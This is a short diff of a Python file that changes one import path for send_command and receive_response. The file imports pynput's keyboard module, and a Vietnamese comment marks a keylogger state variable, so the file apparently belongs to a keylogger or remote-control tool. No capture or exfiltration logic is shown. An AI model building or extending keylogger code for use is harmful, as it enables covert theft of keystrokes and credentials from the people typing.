@@ -1,5 +1,5 @@
 from pynput import keyboard
-from Xuly_Chucnang.KetNoi_GiaoTiep import send_command, receive_response
+from General.KetNoi_GiaoTiep import send_command, receive_response
 
 
 # Biến trạng thái keylogger
